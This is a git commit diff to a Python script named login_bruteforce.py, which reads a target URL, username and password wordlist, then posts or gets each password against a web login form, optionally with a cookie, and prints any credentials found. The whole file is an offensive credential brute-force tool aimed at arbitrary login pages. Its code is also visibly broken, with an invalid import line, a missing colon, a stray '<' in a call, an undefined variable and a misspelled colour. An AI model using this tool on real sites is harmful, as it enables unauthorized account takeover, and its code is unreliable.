da93002c51cb233126ed00bb1f65bbb9772025a8
Stephen A. Daire <73073621+Proteanindustries@users.noreply.github.com>
2022-07-07 13:23:47 -0400

    Update login_bruteforce.py

--- login_bruteforce.py
+++ login_bruteforce.py
@@ -1,23 +1,27 @@
 import requests
-
+import termcolor import colored
 
 url = input('[+] Enter Page URL: ')
 username = input('[+] Enter Username For the Account to Bruteforce: ')
 password_file = input('[+] Enter Password File to Use: ')
 login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
+cookie_value = input('Enter Cookie Value(Optional): ')
 
 
 def cracking(username, url)
     for password in passwords:
         password = password.strip()
-        print('Trying: ' + password)
-        data = {'username':username,'password':password,'Login':'submit'}  #fields & request.get require modification per target
-        response = requests.post(url, data=data)
+        print(colored(('Trying: ' + password), 'red'))
+        data = {'username':username,'password':password,'Login':'submit'} #fields require modification per target
+        if cookie_value != '': 
+            response = requests.get(url, params = {'username':username,'password':password,'Login':'Login'}, < cookies = {'Cookie': cookie_value}) #fields & request.get require modification per target
+        else:
+            response = requests.post(url, data=data) #request.post requires modification per target
         if login_failed_string in response.content.decode():
             pass
         else:
-            print('[+] Found Username: ==> ' + username)
-            print('[+] Found Password: ==> ' + password)
+            print(colored(('[+] Found Username: ==> ' + username), 'green'))
+            print(colored(('[+] Found Password: ==> ' + password), 'greem'))
             exit()
 
 
